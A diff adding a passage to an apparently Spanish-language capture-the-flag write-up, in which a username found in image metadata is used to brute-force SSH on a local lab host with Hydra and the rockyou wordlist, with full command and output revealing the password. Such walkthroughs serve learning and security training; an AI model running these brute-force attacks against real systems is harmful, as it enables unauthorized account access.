@@ -154,4 +154,17 @@ Image Size                      : 455x455
 Megapixels                      : 0.207
 ```
 
-Podemos observar que el análisis nos ha reportado un nombre de usuario el cual podría ser válido para el servicio SSH que habíamos visto anteriormente.  Pero, para ello, primero debemos obtener el password.  Pa
+Podemos observar que el análisis nos ha reportado un nombre de usuario el cual podría ser válido para el servicio SSH que habíamos visto anteriormente.  Pero, para ello, primero debemos obtener el password.  Para ello haremos uso de fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) y el diccionario de [rockyou](https://github.com/topics/rockyou-wordlist).
+```ruby
+❯ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 13:48:12
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
+[STATUS] attack finished for 172.17.0.2 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 13:48:14
+```
